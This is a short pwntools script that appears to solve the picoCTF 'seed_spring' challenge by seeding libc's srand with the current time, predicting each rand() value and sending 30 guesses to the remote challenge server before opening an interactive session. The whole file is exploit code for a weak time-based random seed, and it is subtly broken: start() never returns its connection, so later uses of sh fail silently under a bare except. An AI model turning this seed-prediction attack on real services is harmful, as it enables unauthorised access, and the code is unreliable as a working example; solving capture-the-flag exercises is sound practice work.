from pwn import *
import sys
import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

argv = sys.argv

DEBUG = True
BINARY = './seed_spring'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

#def attach_gdb():
#  gdb.attach(sh)


#if DEBUG:
context.log_level = 'info'


def start():
    sh = remote('jupiter.challenges.picoctf.org', 8311)

for y in range(100):

  start()
#elf = ELF("./seed_spring")
#sh = elf.process()
  try:
    LIBC.srand(LIBC.time(0)+y)
    print(LIBC.time(0))
    for i in range(30):
      #print(str(LIBC.rand() & 0xf))
      sh.sendlineafter('Guess the height: ', str(LIBC.rand() & 0xf))
    sh.interactive()
  except:
    pass
